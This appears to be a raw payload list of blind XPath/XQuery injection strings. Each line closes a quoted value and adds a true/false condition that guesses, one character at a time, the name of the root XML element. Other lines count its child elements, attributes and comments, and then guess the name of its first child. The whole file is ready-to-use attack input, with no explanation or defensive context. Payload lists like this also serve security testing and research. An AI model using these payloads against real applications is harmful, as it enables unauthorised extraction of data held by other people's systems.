XQuery' and substring(name(/*[1]),2,1)='I' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='J' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='K' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='L' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='M' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='N' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='O' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='P' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='Q' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='R' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='S' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='T' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='U' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='V' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='W' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='X' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='Y' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='Z' and '1'='1
XQuery' and substring(name(/*[1]),2,1)='a' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='0' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='1' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='2' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='3' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='4' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='5' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='6' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='7' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='8' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='9' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='A' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='B' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='C' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='D' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='E' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='F' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='G' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='H' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='I' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='J' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='K' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='L' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='M' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='N' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='O' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='P' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='Q' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='R' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='S' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='T' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='U' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='V' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='W' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='X' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='Y' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='Z' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='a' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='b' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='c' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='d' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='e' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='f' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='g' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='h' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='i' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='j' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='k' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='l' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='m' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='n' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='o' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='p' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='q' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='r' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='s' and '1'='1
XQuery' and substring(name(/*[1]),3,1)='t' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='0' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='1' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='2' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='3' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='4' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='5' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='6' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='7' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='8' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='9' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='A' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='B' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='C' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='D' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='E' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='F' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='G' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='H' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='I' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='J' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='K' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='L' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='M' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='N' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='O' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='P' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='Q' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='R' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='S' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='T' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='U' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='V' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='W' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='X' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='Y' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='Z' and '1'='1
XQuery' and substring(name(/*[1]),4,1)='a' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='0' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='1' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='2' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='3' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='4' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='5' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='6' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='7' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='8' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='9' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='A' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='B' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='C' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='D' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='E' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='F' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='G' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='H' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='I' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='J' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='K' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='L' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='M' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='N' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='O' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='P' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='Q' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='R' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='S' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='T' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='U' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='V' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='W' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='X' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='Y' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='Z' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='a' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='b' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='c' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='d' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='e' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='f' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='g' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='h' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='i' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='j' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='k' and '1'='1
XQuery' and substring(name(/*[1]),5,1)='l' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='0' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='1' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='2' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='3' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='4' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='5' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='6' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='7' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='8' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='9' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='A' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='B' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='C' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='D' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='E' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='F' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='G' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='H' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='I' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='J' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='K' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='L' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='M' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='N' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='O' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='P' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='Q' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='R' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='S' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='T' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='U' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='V' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='W' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='X' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='Y' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='Z' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='a' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='b' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='c' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='d' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='e' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='f' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='g' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='h' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='i' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='j' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='k' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='l' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='m' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='n' and '1'='1
XQuery' and substring(name(/*[1]),6,1)='o' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='0' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='1' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='2' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='3' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='4' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='5' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='6' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='7' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='8' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='9' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='A' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='B' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='C' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='D' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='E' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='F' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='G' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='H' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='I' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='J' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='K' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='L' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='M' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='N' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='O' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='P' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='Q' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='R' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='S' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='T' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='U' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='V' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='W' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='X' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='Y' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='Z' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='a' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='b' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='c' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='d' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='e' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='f' and '1'='1
XQuery' and substring(name(/*[1]),7,1)='g' and '1'='1
XQuery' and count(/*[1]/*)=1 and '1'='1
XQuery' and count(/*[1]/*)=2 and '1'='1
XQuery' and count(/*[1]/@*)=1 and '1'='1
XQuery' and count(/*[1]/@*)=2 and '1'='1
XQuery' and count(/*[1]/@*)=3 and '1'='1
XQuery' and count(/*[1]/@*)=4 and '1'='1
XQuery' and count(/*[1]/@*)=5 and '1'='1
XQuery' and count(/*[1]/@*)=6 and '1'='1
XQuery' and count(/*[1]/@*)=7 and '1'='1
XQuery' and count(/*[1]/@*)=8 and '1'='1
XQuery' and count(/*[1]/@*)=9 and '1'='1
XQuery' and count(/*[1]/@*)=10 and '1'='1
XQuery' and count(/*[1]/@*)=11 and '1'='1
XQuery' and count(/*[1]/@*)=12 and '1'='1
XQuery' and count(/*[1]/@*)=13 and '1'='1
XQuery' and count(/*[1]/@*)=14 and '1'='1
XQuery' and count(/*[1]/@*)=15 and '1'='1
XQuery' and count(/*[1]/@*)=16 and '1'='1
XQuery' and count(/*[1]/@*)=17 and '1'='1
XQuery' and count(/*[1]/@*)=18 and '1'='1
XQuery' and count(/*[1]/@*)=19 and '1'='1
XQuery' and count(/*[1]/@*)=20 and '1'='1
XQuery' and count(/*[1]/comment())=1 and '1'='1
XQuery' and count(/*[1]/comment())=2 and '1'='1
XQuery' and count(/*[1]/comment())=3 and '1'='1
XQuery' and count(/*[1]/comment())=4 and '1'='1
XQuery' and count(/*[1]/comment())=5 and '1'='1
XQuery' and count(/*[1]/comment())=6 and '1'='1
XQuery' and count(/*[1]/comment())=7 and '1'='1
XQuery' and count(/*[1]/comment())=8 and '1'='1
XQuery' and count(/*[1]/comment())=9 and '1'='1
XQuery' and count(/*[1]/comment())=10 and '1'='1
XQuery' and count(/*[1]/comment())=11 and '1'='1
XQuery' and count(/*[1]/comment())=12 and '1'='1
XQuery' and count(/*[1]/comment())=13 and '1'='1
XQuery' and count(/*[1]/comment())=14 and '1'='1
XQuery' and count(/*[1]/comment())=15 and '1'='1
XQuery' and count(/*[1]/comment())=16 and '1'='1
XQuery' and count(/*[1]/comment())=17 and '1'='1
XQuery' and count(/*[1]/comment())=18 and '1'='1
XQuery' and count(/*[1]/comment())=19 and '1'='1
XQuery' and count(/*[1]/comment())=20 and '1'='1
XQuery' and string-length(name(/*[1]/*[1]))=1 and '1'='1
XQuery' and string-length(name(/*[1]/*[1]))=2 and '1'='1
XQuery' and string-length(name(/*[1]/*[1]))=3 and '1'='1
XQuery' and string-length(name(/*[1]/*[1]))=4 and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='0' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='1' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='2' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='3' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='4' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='5' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='6' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='7' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='8' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='9' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='A' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='B' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='C' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='D' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='E' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='F' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='G' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='H' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='I' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='J' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='K' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='L' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='M' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='N' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='O' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='P' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='Q' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='R' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='S' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='T' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='U' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='V' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='W' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='X' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='Y' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='Z' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='a' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),1,1)='b' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),2,1)='0' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),2,1)='1' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),2,1)='2' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),2,1)='3' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),2,1)='4' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),2,1)='5' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),2,1)='6' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),2,1)='7' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),2,1)='8' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),2,1)='9' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),2,1)='A' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),2,1)='B' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),2,1)='C' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),2,1)='D' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),2,1)='E' and '1'='1
XQuery' and substring(name(/*[1]/*[1]),2,1)='F' and '1'='1
